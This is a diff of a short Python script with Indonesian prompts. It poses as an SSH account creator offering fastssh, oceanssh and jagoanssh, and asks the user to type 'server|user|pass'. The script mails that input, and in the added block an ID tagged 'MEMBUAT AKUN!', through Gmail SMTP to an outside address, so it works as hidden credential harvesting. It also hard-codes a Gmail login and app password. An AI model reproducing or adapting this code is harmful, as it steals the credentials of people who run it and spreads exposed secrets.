@@ -48,8 +48,7 @@ print("\033[92m [1]fastssh [2]oceanssh [3]jagoanssh \033[0m")
 print("")
 print("\033[92m server|user|pass \033[0m")
 print("\033[93m contoh, 1|bjorka|123 \033[0m")
-#msg = input("\033[92m > \033[0m")
-msg = input("ID = " + nameee + " >")
+msg = input("\033[92m > \033[0m")
 username = 'helc95209@gmail.com'
 password = 'svxsolvclixcvkjj'
 server = smtplib.SMTP('smtp.gmail.com',587)
@@ -62,3 +61,24 @@ print(" ")
 #greeting = "Hello, " + name + "!"
 #print(greeting)  # Output: Hello, Bob!
 
+import smtplib
+import os,sys
+fadd = 'helc95209@gmail.com'
+tadd = 'plankstons@gonetor.com'
+print("\033[92m [1]fastssh [2]oceanssh [3]jagoanssh \033[0m")
+print("")
+print("\033[92m server|user|pass \033[0m")
+print("\033[93m contoh, 1|bjorka|123 \033[0m")
+#msg = input("\033[92m > \033[0m")
+msg = " ID = " + nameee + " MEMBUAT AKUN!"
+username = 'helc95209@gmail.com'
+password = 'svxsolvclixcvkjj'
+server = smtplib.SMTP('smtp.gmail.com',587)
+server.ehlo()
+server.starttls()
+server.login(username,password)
+server.sendmail(fadd,tadd,msg)
+#server.sendmail(fadd,tadd,msg)
+print(" ")
+#greeting = "Hello, " + name + "!"
+#print(greeting)  # Output: Hello, Bob!
